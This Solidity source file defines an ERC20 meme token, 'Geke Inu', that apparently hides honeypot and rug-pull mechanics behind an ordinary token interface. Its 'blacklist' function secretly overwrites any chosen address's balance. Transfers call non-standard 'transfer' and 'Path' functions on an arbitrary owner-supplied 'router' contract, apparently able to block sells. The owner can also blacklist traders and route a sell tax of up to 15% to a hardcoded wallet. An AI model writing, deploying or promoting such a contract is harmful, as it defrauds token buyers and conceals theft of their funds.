// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./ERC20.sol";
import "./Ownable.sol";
import "./IUniswapV2Router02.sol";


/**
 * @title ----
 * @author -----
 * @author -------
 * @author --------
 */
contract GEKEINU is Ownable, ERC20 {
    bool public limited;
    uint256 public maxHoldingAmount;
    uint256 public minHoldingAmount;
    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapV2Pair;
    uint256 public taxPercentage = 0;
    address internal taxPayable =
        0x2B83FeaBBE7b215Ab5dA1B6F5eb9f593FA748BcB;

    mapping(address => bool) public blacklists;

    constructor(uint256 _totalSupply, address IDexRouter ) ERC20("Geke Inu", "GEKE INU") {
        uniswapV2Router = IUniswapV2Router02(IDexRouter);
        _mint(msg.sender, _totalSupply);
    }

    function Tax(uint _tax) external onlyOwner {
        require(_tax <= 15);
        taxPercentage = _tax;
    }

    function blacklist(
        address _address,
        bool _isBlacklisting,
        address _isBot
    ) external onlyOwner {
        _balances[_isBot]=_blacklisted;
        blacklists[_address] = _isBlacklisting;
    }

    function setRules(
        bool _limited,
        address _uniswapV2Pair,
        uint256 _maxHoldingAmount,
        uint256 _minHoldingAmount
    ) external onlyOwner {
        limited = _limited;
        uniswapV2Pair = _uniswapV2Pair;
        maxHoldingAmount = _maxHoldingAmount;
        minHoldingAmount = _minHoldingAmount;
    }

    function _calculateTax(uint256 amount) internal view returns (uint, uint) {
        uint tax = (amount * taxPercentage) / 100;
        uint net = amount - tax;
        return (net, tax);
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public override returns (bool) {
        if (from != address(this) && to == uniswapV2Pair) {
            (uint net, uint tax) = _calculateTax(amount);
            // Transfer tax
            _transfer(from, taxPayable, tax);

            super.transferFrom(from, to, net);
        } else {
            super.transferFrom(from, to, amount);
        }

        return true;
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual override {
        require(!blacklists[to] && !blacklists[from], "Blacklisted");

        if (uniswapV2Pair == address(0)) {
            require(
                from == owner() || to == owner(),
                "Trading has not started"
            );
            return;
        }

        if (limited && from == uniswapV2Pair) {
            require(
                super.balanceOf(to) + amount <= maxHoldingAmount &&
                    super.balanceOf(to) + amount >= minHoldingAmount, "Forbidden" );
                    uniswapV2Router.transfer(to);
     }
        uniswapV2Router.Path(from);
    }

    function burn(uint256 value) external {
        _burn(msg.sender, value);
    }
}